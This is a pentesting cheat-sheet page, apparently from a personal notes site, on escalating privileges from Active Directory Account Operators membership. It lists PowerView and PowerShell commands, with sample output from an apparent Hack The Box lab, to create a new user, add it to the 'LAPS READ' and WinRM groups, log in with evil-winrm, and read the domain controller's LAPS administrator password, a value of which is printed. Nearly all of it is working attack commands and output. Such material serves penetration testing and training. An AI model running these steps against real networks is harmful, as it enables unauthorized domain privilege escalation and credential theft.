---
title: "Account Operators"
date: 2025-7-25
tags: ["Active Directory",  "Privilege Escalation",  "Account Operators",  "Credential Dumping",  "LAPS",  "Group Membership Abuse",  "Evil-WinRM",  "PowerView",  "Windows"]
---

### Privesc #1: Create a New User Account and Add it to LAPS (Local Administrator Password Solution) Group

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Create a Cred Object (Runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Create a New User Password Object

```console
$new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> $new_user_password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
```

#### 4. Create a New User Account

```console
New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> New-AdUser 'alice' -enabled $true -accountpassword $new_user_password -Credential $cred
```

#### 5. Add the New User to LAPS Group

```console
Add-DomainGroupMember -Identity 'LAPS READ' -Members '<NEW_USER>' -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Members 'alice' -Credential $cred
```

#### 6. Add the New User to WinRM Group

```console
Add-DomainGroupMember -Identity 'WinRM' -Members '<NEW_USER>' -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity WinRM -Credential $cred -Members 'alice'
```

#### 7. Remote as New User

```console
evil-winrm -i <TARGET> -u '<NEW_USER>' -p '<NEW_USER_PASSWORD>'
```

```console {class="sample-code"}
$ evil-winrm -i 127.0.0.1 -u alice -p 'Test1234'              
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alice\Documents> 
```

#### 8. Read LAPS Password

```console
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\alice\Documents> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd

DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
DNSHostName       : PivotAPI.LicorDeBellota.htb
Enabled           : True
ms-Mcs-AdmPwd     : 82SD67Cuq34TPZm4mnFo
Name              : PIVOTAPI
ObjectClass       : computer
ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
SamAccountName    : PIVOTAPI$
SID               : S-1-5-21-842165252-2479896602-2762773115-1004
UserPrincipalName :
```

{{< /tabcontent >}}
